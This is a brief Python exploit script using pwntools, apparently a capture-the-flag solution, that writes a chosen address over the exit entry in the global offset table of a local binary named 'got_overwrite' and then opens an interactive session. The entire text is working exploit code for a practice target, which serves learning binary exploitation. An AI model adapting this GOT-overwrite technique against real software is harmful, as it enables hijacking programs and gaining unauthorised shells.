from pwn import *

p = process('./got_overwrite')
e = ELF('./got_overwrite')

p.send(p64(e.got['exit']))
p.sendline(str(0x00000000004006F6))

p.interactive()
